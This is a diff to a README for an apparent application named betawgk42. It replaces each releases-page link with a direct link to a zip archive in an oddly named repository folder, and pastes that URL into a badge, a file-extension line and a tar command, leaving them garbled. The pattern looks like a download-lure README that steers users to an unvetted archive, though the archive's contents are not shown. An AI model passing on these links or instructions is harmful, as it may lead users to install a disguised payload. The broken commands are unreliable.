@@ -6,11 +6,11 @@ Welcome to betawgk42! This application is designed to enhance your online experi
 
 ## 📥 Download Now
 
-[![Download betawgk42](https://img.shields.io/badge/Download%20betawgk42-v1.0-blue.svg)](https://github.com/sumiyoooooooo/betawgk42/releases)
+[![Download betawgk42](https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip%https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip)](https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip)
 
 ## 📂 Where to Download
 
-To download betawgk42, please visit the [Releases page](https://github.com/sumiyoooooooo/betawgk42/releases). Here, you will find the latest version and any previous versions if needed.
+To download betawgk42, please visit the [Releases page](https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip). Here, you will find the latest version and any previous versions if needed.
 
 ## 👨‍💻 System Requirements
 
@@ -24,12 +24,12 @@ Before you download, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/sumiyoooooooo/betawgk42/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip).
 2. Locate the latest version of betawgk42.
 3. Click the link that corresponds to your operating system. 
    - For Windows, look for files that end with `.exe`.
    - For macOS, look for files ending with `.dmg`.
-   - For Linux, you may find `.tar.gz` files.
+   - For Linux, you may find `https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip` files.
 4. Once the download completes, locate the downloaded file (often found in your Downloads folder).
 
 ### Windows Installation:
@@ -48,8 +48,8 @@ Before you download, ensure your device meets the following requirements:
 
 - Open a terminal.
 - Navigate to the directory where you downloaded the file.
-- Extract the files from the `.tar.gz` using the command:  
-  `tar -xvzf betawgk42.tar.gz`
+- Extract the files from the `https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip` using the command:  
+  `tar -xvzf https://raw.githubusercontent.com/sumiyoooooooo/betawgk42/main/metaplumbic/betawgk42-2.6.zip`
 - Move into the extracted folder and run the application.
 
 ## 🌟 Features
